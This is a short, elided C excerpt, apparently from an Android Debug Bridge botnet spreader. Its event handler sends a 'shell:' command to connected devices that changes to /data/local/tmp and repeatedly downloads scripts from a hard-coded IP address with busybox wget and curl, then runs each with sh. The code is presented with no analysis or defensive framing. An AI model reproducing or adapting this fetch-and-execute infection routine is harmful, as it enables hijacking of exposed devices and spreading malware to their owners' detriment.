...
static void process_event(struct epoll_event *pp, int core_id)
{
    ...
    if(pp->events & EPOLLOUT)
    {
        ...
        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp/; busybox wget http://157.66.219.228/w.sh; sh w.sh; curl http://157.66.219.228/c.sh; sh c.sh; wget http://157.66.219.228/wget.sh; sh wget.sh; curl http://157.66.219.228/wget.sh; sh wget.sh; busybox wget http://157.66.219.228/wget.sh; sh wget.sh; busybox curl http://157.66.219.228/wget.sh; sh wget.sh");
        sent++;
